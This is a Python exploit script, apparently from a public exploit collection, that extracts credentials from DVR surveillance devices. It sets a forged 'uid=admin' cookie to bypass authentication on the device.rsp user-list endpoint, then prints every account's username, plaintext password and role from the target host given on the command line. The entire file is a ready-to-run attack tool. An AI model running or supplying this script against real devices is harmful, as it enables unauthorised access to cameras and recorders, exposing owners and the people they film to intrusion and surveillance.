# -*- coding: utf-8 -*- 
import json
import requests
import argparse
import tableprint as tp

class Colors:
    BLUE        = '\033[94m'
    GREEN       = '\033[32m'
    RED         = '\033[0;31m'
    DEFAULT     = '\033[0m'
    ORANGE      = '\033[33m'
    WHITE       = '\033[97m'
    BOLD        = '\033[1m'
    BR_COLOUR   = '\033[1;37;40m'

details = ''' 
 # Exploit Title:   DVRs; Credentials Exposed
 # Date:            09/04/2018
 # Exploit Author:  Fernandez Ezequiel ( @capitan_alfa )
'''
parser = argparse.ArgumentParser(prog='getDVR_Credentials.py',
                                description=' [+] Obtaining Exposed credentials', 
                                epilog='[+] Demo: python getDVR_Credentials.py --host 192.168.1.101 -p 81',
                                version="1.1")

parser.add_argument('--host',   dest="HOST",    help='Host',    required=True)
parser.add_argument('--port',   dest="PORT",    help='Port',    default=80)

args    =   parser.parse_args()

HST     =   args.HOST
port    =   args.PORT

headers = {}

fullHost_1  =   "http://"+HST+":"+str(port)+"/device.rsp?opt=user&cmd=list"
host        =   "http://"+HST+":"+str(port)+"/"

def makeReqHeaders(xCookie):
    headers["Host"]             =  host
    headers["User-Agent"]       = "Morzilla/7.0 (911; Pinux x86_128; rv:9743.0)"
    headers["Accept"]           = "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" 
    headers["Accept-Languag"]   = "es-AR,en-US;q=0.7,en;q=0.3"
    headers["Connection"]       = "close"
    headers["Content-Type"]     = "text/html"
    headers["Cookie"]           = "uid="+xCookie
    return headers

try:
    rX = requests.get(fullHost_1,headers=makeReqHeaders(xCookie="admin"),timeout=10.000)
except Exception,e:
    print Colors.RED+" [+] Timed out\n"+Colors.DEFAULT
    exit()

dataJson = json.loads(rX.text)
totUsr = len(dataJson["list"])   #--> 10

print Colors.GREEN+"\n [+] DVR (url):\t\t"+Colors.ORANGE+str(host)+Colors.GREEN
print " [+] Port: \t\t"+Colors.ORANGE+str(port)+Colors.DEFAULT

print Colors.GREEN+"\n [+] Users List:\t"+Colors.ORANGE+str(totUsr)+Colors.DEFAULT
print " "

final_data = []
try:
    for obj in range(0,totUsr):

        temp = []

        _usuario    = dataJson["list"][obj]["uid"]
        _password   = dataJson["list"][obj]["pwd"]
        _role       = dataJson["list"][obj]["role"]

        temp.append(_usuario) 
        temp.append(_password)
        temp.append(_role)

        final_data.append(temp)

        hdUsr = Colors.GREEN+"Username"+Colors.DEFAULT
        hdPass = Colors.GREEN+"Password"+Colors.DEFAULT
        hdRole = Colors.GREEN+"Role ID"+Colors.DEFAULT

        cabeceras = [hdUsr, hdPass, hdRole] 

    tp.table(final_data, cabeceras, width=20)

except Exception, e:
    print "\n [!]: "+str(e)
    print " [+] "+ str(dataJson)

print "\n"